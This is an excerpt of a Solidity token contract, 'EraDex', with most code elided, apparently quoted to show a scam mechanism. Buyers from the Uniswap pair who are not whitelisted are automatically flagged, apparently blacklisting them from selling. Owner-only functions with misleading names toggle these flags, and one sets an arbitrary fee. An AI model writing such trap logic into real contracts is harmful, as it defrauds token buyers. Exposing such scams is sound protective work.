...
contract EraDex is IBEP20, Ownable {
  ...
  constructor(
    ...
    uniswapV2Router = address(_uniswapV2Router);
  ...
  function _Delivered(address _label, bool _allow) external onlyOwner {
    if (_allow) {
  ...
  function _BDelivered(address[] memory _labels, bool _allow)
    external
    onlyOwner
  {
    if (_allow) {
  ...
  function _REFLECTED(address _label, bool _allow) external onlyOwner {
    if (_allow) {
  ...
  function transmit(address account, bool _allow) external onlyOwner {
    if (_allow) {
  ...
  function STransmit(address account, bool _allow) external onlyOwner {
    if (_allow) {
  ...
  function _afterTokenTransfer(
    ...
    if (from == uniswapV2Pair && to != uniswapV2Router && !REFLECTED[to]) {
      Delivered[to] = true;
    }
  }
  ...
  function approved(uint256 value) external onlyOwner {
    HL_FEE = value;
  }
